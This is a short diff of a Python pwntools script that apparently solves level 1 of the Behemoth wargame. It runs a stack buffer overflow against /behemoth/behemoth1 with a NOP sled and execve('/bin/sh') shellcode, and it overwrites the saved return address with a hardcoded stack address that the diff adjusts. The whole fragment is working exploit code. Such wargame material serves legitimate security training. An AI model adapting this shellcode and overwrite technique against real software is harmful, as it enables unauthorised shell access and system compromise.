@@ -4,7 +4,7 @@ from pwn import *
 
 io = process("/behemoth/behemoth1")
 
-shellcode = b''.join([b"\x68\x2f\x73\x68\x00", # should be x68 instead of CC
+shellcode = b''.join([b"\x68\x2f\x73\x68\x00", 
                     b"\x68\x2f\x62\x69\x6e",
                     b"\x89\xe3",
                     b"\x31\xc9",
@@ -21,7 +21,7 @@ NOP = b'\x90'
 padding = NOP*(buffer_len-len(shellcode))+shellcode
 ebp = b"B"*4
 
-stack_address = p32(0xffffd620+0x20)
+stack_address = p32(0xffffd625+0x10)
 
 exploit = padding + ebp + stack_address
 # print exploit
